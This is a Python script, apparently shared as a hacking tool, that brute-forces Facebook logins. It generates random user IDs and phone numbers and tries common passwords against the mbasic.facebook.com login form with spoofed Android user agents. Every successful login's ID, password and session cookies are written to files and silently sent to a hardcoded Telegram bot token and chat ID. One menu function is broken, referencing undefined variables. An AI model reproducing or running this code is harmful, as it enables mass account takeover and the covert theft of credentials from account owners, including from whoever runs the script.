#!/usr/bin/python3
#-*-coding:utf-8-*-

'''
this is an open source program by Mr. Error (Azim-Vau)
give credit before modifying <3 [>_]
'''

P = '\x1b[1;97m'
M = '\x1b[1;31m'
H = '\x1b[1;32m'
K = '\x1b[1;33m'
B = '\x1b[1;34m'
U = '\x1b[1;35m' 
O = '\x1b[1;36m'
N = '\x1b[0m' 
Z = "\033[1;30m"
FM = '\033[0;41m'
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'

tokenn = '6508582139:AAGlsIONZnQOrMypVtpdZaC8IclEGSYtAxo'
ID= '5504121561'

import os
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    import bs4
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize bs4 requests futures==2 > /dev/null')
    os.system('python number.py')


import requests,json,os,sys,random,datetime,subprocess,time,re,calendar,base64,zlib,string,platform
from bs4 import BeautifulSoup as sop


loop = 0
oks = []
cps = []

def xox(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)
def sex():
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	fbrv = str(random.randint(000000000,999999999))
	density = random.choice(['2.0'])
	width = random.choice(["1080"])
	height = random.choice(["2400"])
	nam = random.choice(["Redmi 4","Redmi 5","Redmi 6","Redmi 6A"])
	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/Wifi;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/{nam};FBSV/11;FBOP/1;FBCA/arm64-v8a:]"
	return ua

def banner():
	os.system("clear")
	print("")
	print("%s    ██████  ▒█████   ▄▄▄██ ▀▀██▓ ▄▄▄▄   "%(B))
	print("%s  ▒██    ▒ ▒██▒  ██▒   ▒██  ▓██▒▓█████▄ "%(B))
	print("%s  ░ ▓██▄   ▒██░  ██▒   ░██  ▒██▒▒██▒ ▄██"%(M))
	print("%s    ▒   ██▒▒██   ██░▓██▄██▓ ░██░▒██░█▀  "%(M))
	print("%s  ▒██████▒▒░ ████▓▒░ ▓███▒  ░██░░▓█  ▀█▓"%(M))
	print("%s  ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░  ▒▓▒▒░  ░▓  ░▒▓███▀▒"%(Z))
	print("%s  ░ ░▒  ░ ░  ░ ▒ ▒░  ▒ ░▒░   ▒ ░▒░▒   ░ "%(Z))
	print("%s  ░  ░  ░  ░ ░ ░ ▒   ░ ░ ░   ▒ ░ ░    ░ "%(Z))
	print("%s        ░      ░ ░   ░   ░   ░   ░      "%(Z))
	print("%s                                      ░     "%(Z))
	print("")
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %s☆☬sojib☬☆                    %s║"%(Z,K,M,Z))
	print("%s║%s  Github   : %shttps://github.com/Sew-ji    %s║"%(Z,K,O,Z))
	print("%s║%s  Telegram : %shttps://t.me/SojibBoss       %s║"%(Z,K,O,Z))
	print("%s║%s  Version  : %s1.0                          %s║"%(Z,K,U,Z))
	print("%s╚══════════════════════════════════════════╝"%(Z))
	print("")
	xox('            %s》%s》%s》%sSJ★UID%s《%s《%s《'%(M,H,B,H,B,H,M))
	print("")

def linex():
	print("%s════════════════════════════════════════════%s\n"%(Z,N))


def result(OK,cp):
	if len(OK) != 0 or len(cp) != 0:
		print("\n\n\033[94;1m THE PROCESS HAS BEEN COMPLETED")
		print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: %s/%s"%(str(len(OK)),str(len(cp))))
		azimvau()
	else:
		azimvau()

def azimvau():
	os.system('clear')
	banner()
	print(f' {H}[1] RANDOM NUMBER CRACK')
	print(f' {K}[2] RANDOM UID CRACK')
	print(f" {H}[3] RANDOM UID INDIA")
	print(f' {M}[B] BACK\n')
	opt = '2'
	if opt =='1':
		random_number()
	elif opt =='2':
		random_uid()
	elif opt =='3':
		India()
	else:
		print('\n\033[1;31m CHOOSE A VALID OPTION\033[0;97m')


def random_number():
	user=[]
	banner()
	os.system('clear')
	print(f"          {FM}PUT A FULL MOBILE NUMBER{N}\n         {FM}OF ANY COUNTRY AS YOU WISH{N}\n")
	print(f" {M}FOR EXAMPLE : {Z}[{H}+88017XXXXXXXX{Z}]\n")
	fkode = input(f'{K} PUT NUMBER : {H}')
	if len(fkode) < 10:
		xox(f'\n{M} ERROR! MAYBE YOU PUT THE WRONG NUMBER ')
		time.sleep(2)
		random_number()
	else:
		pass
	kode = fkode[0:-7]
	for nmbr in range(20000):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	print(f"\n {M}EXAMPLE : {Z}[{H}6,7,8,9,10,11{Z}]\n")
	psl = int(input(f" {B}PASS LENGHT : {H}"))
	with ThreadPool(max_workers=30) as zim:
		os.system('clear')
		banner()
		tl = str(len(user))
		xox(f"{K} TOTAL IDS : {K}{tl}")
		xox(f"{H} BRUTE HAS BEEN STARTED {N}")
		xox(f"{B} WAIT AND SEE {H}✘{M}✘ {N}")
		linex()
		for guru in user:
			uid = kode+guru
			pwx = [uid[-psl:]]
			zim.submit(cracker,uid,pwx,tl)
	result(oks,cps)
	
###------____________________
def clear():
        os.system(f'clear')
        banner()

def India():
    clear()
    print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} +91639{G}/{A}+91934{G}/{A}+91902{G}/{A}+91701');linex()
    code = input(f' {G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')
    clear()
    print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex()
    limit = int(input(f' {G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with ThreadPool(max_workers=30) as zim:
        clear()
        print(f' {A}[{G1}≈{A}]{G1} SIM CODE  {A}➢\x1b[1;96m {code}')
        print(f' {A}[{G1}≈{A}]{G1} TOTAL UID {A}➢\033[33;1m {str(len(user))}')
        print(f" {A}[{G1}={A}]\033[1;97m TURN {A}[\033[38;5;46mON{A}/\x1b[38;5;196mOFF{A}]\033[1;97m AIRPLANE MODE ");linex()
        for love in user:
            ids = code + love
            psd = [love,ids[:8],'57273200','59039200','57575751','57575752']
            zim.submit(cracker,uid,pwx,tl)
	#result(oks,cps)
    
def random_uid():
	user=[]
	os.system('clear')
	banner()
	for nmbr in range(50000):
		nmp = ''.join(random.choice(string.digits) for _ in range(9))
		user.append("100000"+nmp)
	print(f' {H}EXAMPLE : 123456,1234567,12345678 {N}\n')
	pwx = ['123456','1234567','12345678','zzxxccvv','mmnnbbvv','qqwweerr','aassdd','a12345','a12345a','aa12345','aa12345678','a12345678']
	with ThreadPool(max_workers=30) as zim:
		os.system('clear')
		banner()
		tl = str(len(user))
		xox(f"{K} TOTAL IDS : {K}{tl}")
		xox(f"{H} BRUTE HAS BEEN STARTED {N}")
		xox(f"{B} WAIT AND SEE {H}✘{M}✘ {N}")
		linex()
		for uid in user:
			zim.submit(cracker,uid,pwx,tl)
	result(oks,cps)
	

def cracker(uid,pwx,tl):
	global loop
	global cps
	global oks
	try:
		for pasw in pwx:
			ses = requests.Session()
			heas = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=hIHkY2vA62DGg9nrC-FOcZtc; sb=hIHkY-rfaqoOqH-YqIbekG50; m_pixel_ratio=2; wd=360x592; fr=0NTTEYvdHu72dGAFS..Bj5IGE.f6.AAA.0.0.Bj5IGO.AWXtxZy12bM',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'accept-encoding': 'gzip, deflate',
    'user-agent': sex(),
}
			link = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8", headers=heas)
			gett = sop(link.text, "html.parser")
			datax = gett.find("form",{"method":"post"})["action"]
			data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
				"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
				"m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
				"li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
				"try_number": "0",
				"unrecognized_tries": "0",
				"email": uid,
				"pass": pasw,
				"login": "Masuk",
				"bi_xrwh": "0"}
			cookie = dict(ses.cookies.get_dict())
			head = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=hIHkY2vA62DGg9nrC-FOcZtc; sb=hIHkY-rfaqoOqH-YqIbekG50; m_pixel_ratio=2; wd=360x592; fr=0NTTEYvdHu72dGAFS..Bj5IGE.f6.AAA.0.0.Bj5IGO.AWXtxZy12bM',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
    'upgrade-insecure-requests': '1',
    'accept-encoding': 'gzip, deflate',
    'user-agent': sex(),
}
			xnxx = ses.post(f"https://mbasic.facebook.com{datax}", data=data, cookies=cookie, headers=head, allow_redirects=True)
			fb_cookies=ses.cookies.get_dict().keys()
			if 'c_user' in fb_cookies:
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[65:80]
				print('\033[1;32m [SJ-OK] '+uidx+' | '+pasw+'\033[0;97m')
				statusok = f'''⪧ ❲حساب صحيح❳
┏ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ᯽ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ┓

  ◊ - ID ➛ {uidx}\n

  ◊ - PASSWORD ➛ {pasw}\n
  ◊ - cookies  ➛ {coki}\n
┗ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ᯽ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ┛
⪧ BY : @ddfmoto0					
					'''
				requests.get("https://api.telegram.org/bot"+str(tokenn)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))

				open('OK.txt', 'a').write(uidx+'|'+pasw+'\n')
				oks.append(uidx)
				break
			elif 'checkpoint' in fb_cookies:
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [SJ-CP] '+uidx+' | '+pasw+'\033[0;97m')
				statuscp = f'''⪧ ❲ CP ❳
┏ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ᯽ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ┓

◆ - ID ➛ {uidx}\n

◆ - PASSWORD ➛ {pasw}\n

┗ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ᯽ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ┛
⪧ BY : @ddfmoto0					
            '''
				requests.get("https://api.telegram.org/bot"+str(tokenn)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))

				open('CP.txt', 'a').write(uidx+'|'+pasw+'\n')
				cps.append(uidx)
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f"\r {Z}[{H}{loop}{P}-{M}{tl}{Z}] {Z}[{H}{len(oks)}{B}-{K}{len(cps)}{Z}] {Z}[{M}{'{:.1%}'.format(loop/int(tl))}{Z}]  \r"),
		sys.stdout.flush()
	except:
		pass




if __name__=='__main__':
	azimvau()
